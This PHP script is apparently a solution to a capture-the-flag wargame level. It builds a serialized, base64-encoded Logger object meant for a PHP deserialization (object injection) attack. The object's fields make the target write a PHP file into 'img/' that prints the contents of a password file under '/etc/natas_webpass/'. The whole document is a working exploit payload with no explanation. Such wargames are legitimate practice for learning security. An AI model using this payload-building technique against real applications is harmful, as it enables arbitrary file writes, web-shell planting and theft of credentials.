<?php

class Logger{
    private $logFile;
    private $initMsg;
    private $exitMsg;
    
    function __construct(){
        // initialise variables
        $this->initMsg="#--session started--#\n";
        $this->exitMsg="<?php echo file_get_contents(\"/etc/natas_webpass/natas27\");?>";
        $this->logFile = "img/passwd.php";
    }                       
    
    function log($msg){
        $fd=fopen($this->logFile,"a+");
        fwrite($fd,$msg."\n");
        fclose($fd);
    }                       
    
    function __destruct(){
        
    }                       
}

$mylog = new Logger();

print base64_encode(serialize($mylog));

?>